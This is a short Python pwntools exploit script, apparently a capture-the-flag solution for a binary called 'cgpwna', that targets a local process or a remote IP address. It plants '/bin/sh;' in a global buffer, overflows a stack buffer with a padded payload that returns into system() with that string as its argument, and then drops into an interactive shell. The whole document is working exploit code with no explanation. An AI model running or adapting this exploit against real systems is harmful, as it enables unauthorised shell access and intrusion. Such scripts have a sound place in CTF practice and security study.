#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import struct
from pwn import *

context.log_level = 'debug'

fn = './cgpwna'
elf = ELF(fn)

if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('182.254.217.142', 10001)

bss_sh = 0x0804A080

io.sendlineafter(':\n', '1')
# raw_input('w')
payload = ''.join([
    '/bin/sh;',
    'a' * (0x0804A0A8 - 0x0804A080 - len('/bin/sh;')),
    struct.pack('<h', 0xff),
])
io.sendlineafter(':\n', payload)
payload = ''.join([
    'a' * (0x30 + 4),
    p32(elf.symbols['system']),
    p32(0xdeedbeef),
    p32(bss_sh),
])
io.sendlineafter(':\n', payload)
io.interactive()
